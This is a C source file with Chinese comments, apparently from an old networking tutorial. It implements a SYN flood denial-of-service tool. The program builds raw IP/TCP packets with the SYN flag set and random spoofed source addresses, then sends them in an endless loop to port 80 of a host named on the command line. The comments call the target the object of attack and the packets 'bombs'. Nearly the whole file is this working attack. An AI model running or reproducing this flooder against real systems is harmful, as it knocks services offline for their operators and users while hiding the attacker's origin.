#include <sys/socket.h>;
#include <netinet/in.h>;
#include <netinet/ip.h>;
#include <netinet/tcp.h>;
#include <stdlib.h>;
#include <errno.h>;
#include <unistd.h>;
#include <stdio.h>;
#include <netdb.h>;
#define DESTPORT 80 /* 要攻击的端口(WEB) */
#define LOCALPORT 8888
void send_tcp(int sockfd,struct sockaddr_in *addr);
unsigned short check_sum(unsigned short *addr,int len);
int main(int argc,char **argv)
{
int sockfd;
struct sockaddr_in addr;
struct hostent *host;
int on=1;
if(argc!=2)
{
fprintf(stderr,"Usage:%s hostname\n\a",argv[0]);
exit(1);
}
bzero(&addr,sizeof(struct sockaddr_in));
addr.sin_family=AF_INET;
addr.sin_port=htons(DESTPORT);
if(inet_aton(argv[1],&addr.sin_addr)==0)
{
host=gethostbyname(argv[1]);
if(host==NULL)
{
fprintf(stderr,"HostName Error:%s\n\a",hstrerror(h_errno));
exit(1);
}
addr.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
}
/**** 使用 IPPROTO_TCP 创建一个 TCP 的原始套接字 ****/
sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
if(sockfd<0)
{
fprintf(stderr,"Socket Error:%s\n\a",strerror(errno));
exit(1);
}
/******** 设置 IP 数据包格式,告诉系统内核模块 IP 数据包由我们自己来填写 ***/
setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
/**** 没有办法,只用超级护用户才可以使用原始套接字 *********/
setuid(getpid());
/********* 发送炸弹了!!!! ****/
send_tcp(sockfd,&addr);
}
/******* 发送炸弹的实现 *********/
void send_tcp(int sockfd,struct sockaddr_in *addr)
{
char buffer[100]; /**** 用来放置我们的数据包 ****/
struct ip *ip;
struct tcphdr *tcp;
int head_len;
/******* 我们的数据包实际上没有任何内容,所以长度就是两个结构的长度 ***/
head_len=sizeof(struct ip)+sizeof(struct tcphdr);
bzero(buffer,100);
/******** 填充 IP 数据包的头部,还记得 IP 的头格式吗? ******/
ip=(struct ip *)buffer;
ip->ip_v=IPVERSION; /** 版本一般的是 4 **/
ip->ip_hl=sizeof(struct ip)>>2; /** IP 数据包的头部长度 **/
ip->ip_tos=0; /** 服务类型 **/
ip->ip_len=htons(head_len); /** IP 数据包的长度 **/
ip->ip_id=0; /** 让系统去填写吧 **/
ip->ip_off=0; /** 和上面一样,省点时间 **/
ip->ip_ttl=MAXTTL; /** 最长的时间 255 **/
ip->ip_p=IPPROTO_TCP; /** 我们要发的是 TCP 包 **/
ip->ip_sum=0; /** 校验和让系统去做 **/
ip->ip_dst=addr->sin_addr; /** 我们攻击的对象 **/
/******* 开始填写 TCP 数据包 *****/
tcp=(struct tcphdr *)(buffer +sizeof(struct ip));
tcp->source=htons(LOCALPORT);
tcp->dest=addr->sin_port; /** 目的端口 **/
tcp->seq=random();
tcp->ack_seq=0;
tcp->doff=5;
tcp->syn=1; /** 我要建立连接 **/
tcp->check=0;
/** 好了,一切都准备好了.服务器,你准备好了没有?? ^_^ **/
while(1)
{
/** 你不知道我是从那里来的,慢慢的去等吧! **/
ip->ip_src.s_addr=random();
/** 什么都让系统做了,也没有多大的意思,还是让我们自己来校验头部吧 */
/** 下面这条可有可无 */
tcp->check=check_sum((unsigned short *)tcp,
sizeof(struct tcphdr));
sendto(sockfd,buffer,head_len,0,addr,sizeof(struct sockaddr_in));
}
}
/* 下面是首部校验和的算法,偷了别人的 */
unsigned short check_sum(unsigned short *addr,int len)
{
register int nleft=len;
register int sum=0;
register short *w=addr;
short answer=0;
while(nleft>1)
{
sum+=*w++;
nleft-=2;
}
if(nleft==1)
{
*(unsigned char *)(&answer)=*(unsigned char *)w;
sum+=answer;
}
sum=(sum>>16)+(sum&0xffff);
sum+=(sum>>16);
answer=~sum;
return(answer);
}

